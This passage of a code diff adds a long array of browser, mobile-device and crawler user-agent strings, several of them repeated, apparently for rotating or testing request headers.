+    "Mozilla/5.0 (Linux; Android 4.1.2; SHV-E250S Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36",
+    "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
+    "Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
+    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36 OPR/36.0.2130.46",
+    "Mozilla/5.0 (compatible; Konqueror/4.4; Linux) KHTML/4.4.1 (like Gecko) Fedora/4.4.1-1.fc12",
+    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; ADR6300 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0",
+    "Offline Explorer/2.5",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
+    "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; GT-P5210 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
+    "Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)",
+    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
+    "Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
+    "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
+    "Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 920) like Geckoo",
+    "Mozilla/5.0 (compatible; Konqueror/3.5; SunOS) KHTML/3.5.1 (like Gecko)",
+    "Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+    "MobileSafari/600.1.4 CFNetwork/711.1.12 Darwin/14.0.0",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
+    "msnbot/1.1 ( http://search.msn.com/msnbot.htm)",
+    "Mozilla/5.0 (Android; Mobile; rv:35.0) Gecko/35.0 Firefox/35.0",
+    "Mozilla/5.0 (X11; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0",
+    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36 OPR/19.0.1326.56",
+    "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
+    "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
+    "grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)",
+    "Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
+    "Googlebot-Video/1.0",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
+    "Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1",
+    "Mozilla/5.0 (compatible; Konqueror/3.5; Linux 2.6.30-7.dmz.1-liquorix-686; X11) KHTML/3.5.10 (like Gecko) (Debian package 4:3.5.10.dfsg.1-1 b1)",
+    "Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0",
+    "Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
+    "FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36 OPR/18.0.1284.49",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
+    "Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
+    "Mozilla/5.0 (Macintosh; U; Mac OS X Mach-O; en-US; rv:2.0a) Gecko/20040614 Firefox/3.0.0",
+    "Opera/9.20 (Macintosh; Intel Mac OS X; U; en)",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/18.0.130791545 Mobile/14A5345a Safari/600.1.4",
+    "Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/30.0.1599.12 Mobile/11A465 Safari/8536.25 (3B92C18B-D9DE-4CB7-A02A-22FD2AF17C8F)",
+    "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/536.5 (KHTML like Gecko) Chrome/19.0.1084.56 Safari/536.5",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 1083) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36",
+    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
+    "Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0",
+    "Mozilla/5.0 (compatible; Konqueror/4.4; Linux 2.6.32-22-generic; X11; en_US) KHTML/4.4.3 (like Gecko) Kubuntu",
+    "Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1",
+    "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/18.0.130791545 Mobile/14A5345a Safari/600.1.4",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320",
+    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+    "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch)",
+    "AndroidDownloadManager/5.1 (Linux; U; Android 5.1; Z820 Build/LMY47D)",
+    "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
+    "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5",
+    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/4.5.0IT",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C)",
+    "Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
+    "Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
+    "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
+    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
+    "BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
+    "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
+    "Mozilla/5.0 (Linux; Android 4.1.2; SHV-E250S Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
+    "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.4 (KHTML like Gecko) Chrome/22.0.1229.79 Safari/537.4",
+    "Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11) XV6800",
+    "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) QupZilla/1.9.0 Safari/538.1",
+    "Opera/9.80 (Android; Opera Mini/7.5.33361/31.1543; U; en) Presto/2.8.119 Version/11.1010",
+    "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
+    "Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
+    "Mozilla/5.0 (PLAYSTATION 3; 2.00)",
+    "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 920) like Gecko",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:20.0) Gecko/20100101 Firefox/20.0",
+    "Mozilla/5.0 (Linux; U; Android 1.1; en-gb; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
+    "Opera/9.80 (J2ME/MIDP; Opera Mini/8.0.35626/37.8918; U; en) Presto/2.12.423 Version/12.16",
+    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522  (KHTML, like Gecko) Safari/419.3",
+    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
+    "Mozilla/5.0 (compatible; Exabot/3.0;  http://www.exabot.com/go/robot)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
+    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
+    "Mozilla/5.0 (PLAYSTATION 3; 2.00)",
+    "Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)",
+    "Links (2.1pre15; Linux 2.4.26 i686; 158x61)",
+    "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/4.5.0IT",
+    "DoCoMo/2.0 SH901iC(c100;TB;W24H12)",
+    "Mozilla/5.0 (compatible; Konqueror/4.4; Linux 2.6.32-22-generic; X11; en_US) KHTML/4.4.3 (like Gecko) Kubuntu",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0",
+    "Opera/9.25 (Windows NT 6.0; U; en)",
+    "Mozilla/4.8 [en] (Windows NT 5.1; U)",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
+    "Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+    "Mozilla/5.0 (Linux; U; Android 4.1; en-us; sdk Build/MR1) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.1 Safari/534.30",
+    "AndroidDownloadManager/5.1 (Linux; U; Android 5.1; Z820 Build/LMY47D)",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
+    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
+    "Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/536.26.17 (KHTML like Gecko) Version/6.0.2 Safari/536.26.17",
+    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
+    "Mozilla/5.0 (Maemo; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
+    "Opera/7.50 (Windows XP; U)",
+    "wii libnup/1.0",
+    "libwww-perl/5.820",
+    "Opera/9.80 (X11; Linux i686) Presto/2.12.388 Version/12.16",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0",
+    "Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-gb) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/11.0.696.65 Safari/534.35 Puffin/2.9174AP",
+    "Mozilla/5.0 (OS/2; Warp 4.5; rv:10.0.12) Gecko/20100101 Firefox/10.0.12",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20120724 Debian Iceweasel/15.02",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4",
+    "Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0",
+    "Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d",
+    "Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+    "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
+    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; SCH-I800 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+    "Mozilla/5.0 (Linux; Android 8.1.0; BKK-AL10 Build/HONORBKK-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045318 Mobile Safari/537.36 V1_AND_SQ_8.4.5_1468_YYB_D QQ/8.4.5.4745 NetType/WIFI WebP/0.3.0 Pixel/720 StatusBarHeight/56 SimpleUISwitch/0 QQTheme/2097 InMagicWin/0",
+    "Mozilla/5.0 (X11; U; Linux i686; en-gb) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/11.0.696.65 Safari/534.35 Puffin/2.0.5603M",
+    "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
+    "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)",
+    "Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
+    "Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
+    "Mozilla/4.0 (X11) AppleWebKit/84.10 (KHTML, like Gecko) Edge/18.13492 Safari/410.15",
+    "Mozilla/4.0 (Windows NT 6.1) AppleWebKit/35.28 (KHTML, like Gecko) Firefox/20.0 Safari/129.95",
+    "Mozilla/5.0 (X11) AppleWebKit/82.26 (KHTML, like Gecko) Firefox/36.0 Safari/566.46",
+    "Mozilla/4.0 (Macintosh) AppleWebKit/12.28 (KHTML, like Gecko) Firefox/42.0 Safari/547.15",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
+    "Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0",
+    "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1:",
+    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
+    "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0",
+    "ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)",
+    "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
+    "Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 920) like Geckoo",
+    "Mozilla/5.0 (compatible; Konqueror/3.5; SunOS) KHTML/3.5.1 (like Gecko)",
+    "Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+    "MobileSafari/600.1.4 CFNetwork/711.1.12 Darwin/14.0.0",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
+    "msnbot/1.1 ( http://search.msn.com/msnbot.htm)",
+    "Mozilla/5.0 (Android; Mobile; rv:35.0) Gecko/35.0 Firefox/35.0",
+    "Mozilla/5.0 (X11; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0",
+    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36 OPR/19.0.1326.56",
+    "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
+    "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
+    "grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)",
+    "Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
+    "Googlebot-Video/1.0",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.4 (KHTML like Gecko) Chrome/22.0.1229.79 Safari/537.4",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:20.0) Gecko/20100101 Firefox/20.0",
+    "Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.10 Safari/537.21",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+    "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/536.5 (KHTML like Gecko) Chrome/19.0.1084.56 Safari/536.5",
+    "Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)",
+    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+    "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
+    "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+    "Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
+    "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/BuildID) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
+    "W3C_Validator/1.305.2.12 libwww-perl/5.64",
+    "Bloglines/3.1 (http://www.bloglines.com)",
+    "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
+    "LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1",
+    "MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0",
+    "Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0",
+    "NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
+    "Mozilla/5.0 (iPod; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H143 Safari/600.1.4",
+    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
+    "Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+    "Opera/9.0 (Macintosh; PPC Mac OS X; U; en)",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5",
+    "Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
+    "Mozilla/5.0 (OS/2; Warp 4.5; rv:38.0) Gecko/20100101 Firefox/38.0 SeaMonkey/2.35",
+    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; U; Android 2.0.1; de-de; Milestone Build/SHOLS_U2_01.14.0) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
+    "Mozilla/5.0 (Linux; Android 5.0.1; SCH-R970 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
+    "Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
+    "Mozilla/5.0 (Linux; Android 6.0; LG-D850 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.97 Mobile Safari/537.36",
+    "MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; XBLWP7; ZuneWP7) UCBrowser/2.9.0.263",
+    "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0) Gecko/16.0 Firefox/16.0",
+    "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML like Gecko) Ubuntu Chromium/25.0.1364.160 Chrome/25.0.1364.160 Safari/537.22",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
+    "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
+    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
